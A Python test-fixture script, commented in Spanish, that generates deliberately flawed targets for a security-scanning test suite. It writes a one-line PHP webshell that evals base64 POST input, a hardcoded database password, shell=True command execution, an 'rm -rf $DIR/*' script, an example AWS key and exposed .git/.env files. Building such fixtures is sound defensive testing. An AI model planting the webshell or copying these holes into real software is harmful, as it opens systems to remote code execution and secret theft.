"""Objetivos controlados para la batería funcional (se generan en cada ejecución, nada real).

Una webshell, secretos y shell=True en código, y una web con .git/.env expuestos: lo que los
análisis de malware, código y exposición web tienen que encontrar sí o sí.
"""
import sys
from pathlib import Path

T = Path(sys.argv[1])
for d in ("code/config", "web/.git", "www/uploads", "quar"):
    (T / d).mkdir(parents=True, exist_ok=True)
(T / "code/settings.py").write_text('import subprocess\nDB_PASSWORD = "SuperSecreto123"\n\n'
                                    "def run(cmd):\n    return subprocess.call(cmd, shell=True)\n")
(T / "code/deploy.sh").write_text("#!/bin/bash\nrm -rf $DIR/*\n")
# Clave con el formato de AWS pero inventada (la que usa la propia documentación de AWS como ejemplo)
(T / "code/config/prod.env").write_text("AWS_ACCESS_KEY_ID=AKIA" + "IOSFODNN7EXAMPLE\n")
(T / "web/.git/HEAD").write_text("ref: refs/heads/main\n")
(T / "web/.git/config").write_text("[core]\n\trepositoryformatversion = 0\n")
(T / "web/.env").write_text("DB_PASSWORD=demo\n")
(T / "web/index.html").write_text("<html><body>demo</body></html>\n")
(T / "www/uploads/img.php").write_text('<?php eval(base64_decode($_POST["x"])); ?>\n')
(T / "quar/sospechoso.txt").write_text("fichero de prueba para cuarentena\n")
print(f"objetivos en {T}")
